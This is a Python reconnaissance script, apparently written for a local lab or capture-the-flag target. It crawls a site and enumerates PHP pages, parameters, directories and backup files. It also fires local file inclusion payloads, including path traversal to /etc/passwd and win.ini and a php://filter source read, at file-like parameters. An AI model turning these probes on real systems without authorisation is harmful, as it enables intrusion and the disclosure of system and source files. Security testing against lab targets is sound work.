import requests
from bs4 import BeautifulSoup
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs
from collections import defaultdict, OrderedDict

class WebSpider:
    def __init__(self, base_url, max_depth=4):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.max_depth = max_depth
        self.visited = set()
        self.php_pages = set()
        self.parameters = defaultdict(list)
        self.directories = set()
        self.lfi_candidates = []
        self.backup_files = []
        self.api_endpoints = []
        self.errors = []
        
        # Common directories and backup patterns
        self.common_paths = [
            'admin', 'uploads', 'backup', 'old', 'test', 'dev', 
            'posts', 'uploads', 'images', 'static', 'assets',
            'api', 'config', 'includes', 'lib', 'vendor'
        ]
        
        self.backup_patterns = [
            '.php.bak', '.php~', '.bak', '.old', '.backup', '.swp',
            '.php.old', '.php.backup', '.php.swp', '.php.txt'
        ]
        
        self.lfi_payloads = [
            '../../../../../../etc/passwd',
            '../../../../../../windows/win.ini',
            'php://filter/read=convert.base64-encode/resource=index.php'
        ]
    
    def is_internal_url(self, url):
        """Check if URL belongs to the target domain"""
        parsed = urlparse(url)
        return parsed.netloc == self.domain or parsed.netloc == ''
    
    def normalize_url(self, url):
        """Normalize URL to prevent duplicate crawling"""
        return urljoin(self.base_url, url).split('#')[0]  # Remove fragments
    
    def extract_parameters(self, url):
        """Extract and categorize URL parameters"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        param_info = {
            'url': url,
            'params': {}
        }
        
        for param, values in query_params.items():
            param_lower = param.lower()
            param_info['params'][param] = {
                'values': values,
                'potential_lfi': any(x in param_lower for x in ['file', 'path', 'page', 'dir', 'location', 'document', 'include']),
                'response_pattern': None
            }
            
            # If parameter looks like LFI candidate, test it
            if param_info['params'][param]['potential_lfi']:
                self.test_lfi(url, param, values[0])
        
        if query_params:
            page_key = url.split('?')[0]
            self.parameters[page_key].append(param_info)
        
        return query_params
    
    def test_lfi(self, url, param, original_value):
        """Test for Local File Inclusion vulnerabilities"""
        lfi_results = {
            'url': url,
            'param': param,
            'original_value': original_value,
            'tests': []
        }
        
        for payload in self.lfi_payloads:
            try:
                # Test LFI payload
                test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                response = requests.get(test_url, timeout=5)
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'response_snippet': response.text[:200] if response.status_code == 200 else None
                }
                
                # Check for LFI indicators
                indicators = [
                    'root:', '/bin/bash', 'daemon:', 'mysql:',
                    'for 16-bit app support', '[fonts]', '[extensions]',
                    'PD9waHA', 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9u'
                ]
                
                for indicator in indicators:
                    if indicator in response.text:
                        result['lfi_detected'] = True
                        result['indicator'] = indicator
                        break
                
                lfi_results['tests'].append(result)
                
            except Exception as e:
                lfi_results['tests'].append({
                    'payload': payload,
                    'error': str(e)
                })
        
        self.lfi_candidates.append(lfi_results)
    
    def check_backup_files(self, url):
        """Check for common backup and debug files"""
        if not url.endswith('.php'):
            return
        
        base_file = url.split('?')[0]
        
        for ext in self.backup_patterns:
            backup_url = base_file + ext
            try:
                response = requests.get(backup_url, timeout=5)
                if response.status_code == 200 and len(response.content) > 0:
                    self.backup_files.append({
                        'url': backup_url,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_snippet': response.text[:100]
                    })
            except Exception as e:
                self.errors.append(f"Error checking {backup_url}: {e}")
    
    def check_common_directories(self):
        """Check for common directories"""
        print("[*] Checking common directories...")
        for path in self.common_paths:
            test_url = f"{self.base_url}/{path}"
            try:
                response = requests.get(test_url, timeout=5)
                if response.status_code != 404:
                    self.directories.add(test_url)
                    print(f"[+] Found directory: {test_url} (Status: {response.status_code})")
            except Exception as e:
                self.errors.append(f"Error accessing {test_url}: {e}")
    
    def crawl_url(self, url, current_depth=0):
        """Recursively crawl URLs with depth limiting"""
        if current_depth > self.max_depth:
            return
        
        normalized_url = self.normalize_url(url)
        if normalized_url in self.visited:
            return
        
        self.visited.add(normalized_url)
        print(f"[*] Crawling: {normalized_url} (Depth: {current_depth})")
        
        try:
            response = requests.get(normalized_url, timeout=10)
            print(f"    Status: {response.status_code} | Length: {len(response.content)}B")
            
            if response.status_code == 200:
                # Store PHP pages
                if normalized_url.endswith('.php') or '.php?' in normalized_url:
                    self.php_pages.add(normalized_url)
                    self.check_backup_files(normalized_url)
                
                # Extract parameters
                self.extract_parameters(normalized_url)
                
                # Parse HTML for links
                if 'text/html' in response.headers.get('Content-Type', ''):
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    links = soup.find_all('a', href=True)
                    forms = soup.find_all('form', action=True)
                    
                    # Extract URLs from links
                    for link in links:
                        href = link['href']
                        full_url = urljoin(normalized_url, href)
                        
                        if self.is_internal_url(full_url):
                            self.crawl_url(full_url, current_depth + 1)
                    
                    # Extract form actions
                    for form in forms:
                        action = form['action']
                        full_url = urljoin(normalized_url, action)
                        if self.is_internal_url(full_url):
                            method = form.get('method', 'GET').upper()
                            print(f"    [Form] {method}: {full_url}")
        
        except Exception as e:
            self.errors.append(f"Error crawling {normalized_url}: {e}")
    
    def check_special_files(self):
        """Check for robots.txt, sitemap.xml, and other special files"""
        special_files = ['robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml']
        
        print("\n[*] Checking special files...")
        for filename in special_files:
            url = f"{self.base_url}/{filename}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    self.directories.add(url)
                    print(f"[+] Found: {url}")
                    print(f"    Content:\n{response.text[:300]}...")
            except Exception as e:
                self.errors.append(f"Error checking {url}: {e}")
    
    def generate_report(self):
        """Generate comprehensive spider report"""
        print("\n" + "="*80)
        print("WEB SPIDER COMPREHENSIVE REPORT")
        print("="*80)
        
        # PHP Pages Found
        print(f"\n[+] PHP Pages Discovered: {len(self.php_pages)}")
        for page in sorted(self.php_pages):
            param_count = len(self.parameters.get(page, []))
            print(f"  - {page} (Parameters: {param_count})")
        
        # Parameters by Page
        print(f"\n[+] URL Parameters Found:")
        for page, param_list in self.parameters.items():
            if param_list:
                print(f"\n  Page: {page}")
                for param_info in param_list:
                    for param, details in param_info['params'].items():
                        lfi_mark = " [LFI-CANDIDATE]" if details['potential_lfi'] else ""
                        print(f"    - {param}: {details['values']}{lfi_mark}")
        
        # LFI Candidates
        if self.lfi_candidates:
            print(f"\n[+] LFI Testing Results:")
            for test in self.lfi_candidates:
                print(f"\n  Testing: {test['url']}")
                print(f"  Parameter: {test['param']} (Original: {test['original_value']})")
                for result in test['tests']:
                    if result.get('lfi_detected'):
                        print(f"    [!] LFI DETECTED with payload: {result['payload']}")
                        print(f"    [!] Indicator: {result.get('indicator')}")
                    else:
                        print(f"    [-] Test: {result.get('payload', 'N/A')} | Status: {result.get('status_code')}")
        
        # Backup Files
        if self.backup_files:
            print(f"\n[+] Backup/Debug Files Found:")
            for backup in self.backup_files:
                print(f"  - {backup['url']} (Size: {backup['content_length']}B)")
                print(f"    Snippet: {backup['content_snippet'][:80]}...")
        
        # Directories
        print(f"\n[+] Discovered Directories/Paths: {len(self.directories)}")
        for directory in sorted(self.directories):
            print(f"  - {directory}")
        
        # API Endpoints
        if self.api_endpoints:
            print(f"\n[+] API Endpoints: {len(self.api_endpoints)}")
            for endpoint in self.api_endpoints:
                print(f"  - {endpoint}")
        
        # Summary
        print(f"\n[+] SUMMARY:")
        print(f"  Total URLs Visited: {len(self.visited)}")
        print(f"  PHP Pages: {len(self.php_pages)}")
        print(f"  Parameters Found: {sum(len(p) for p in self.parameters.values())}")
        print(f"  LFI Candidates: {len(self.lfi_candidates)}")
        print(f"  Backup Files: {len(self.backup_files)}")
        print(f"  Directories: {len(self.directories)}")
        
        if self.errors:
            print(f"\n[!] Errors Encountered: {len(self.errors)}")
            for error in self.errors[:5]:  # Show first 5 errors
                print(f"  - {error}")
    
    def start(self):
        """Start the spider"""
        print(f"[*] Web Spider Starting - Target: {self.base_url}")
        print(f"[*] Max Depth: {self.max_depth}")
        print(f"[*] Starting crawl from root...\n")
        
        # Check special files first
        self.check_special_files()
        
        # Check common directories
        self.check_common_directories()
        
        # Start crawling from root
        self.crawl_url(self.base_url)
        
        # Generate final report
        self.generate_report()
        
        return self

# Initialize and run spider
if __name__ == "__main__":
    TARGET_URL = "http://127.0.0.1:33209/"
    spider = WebSpider(TARGET_URL, max_depth=4)
    spider.start()
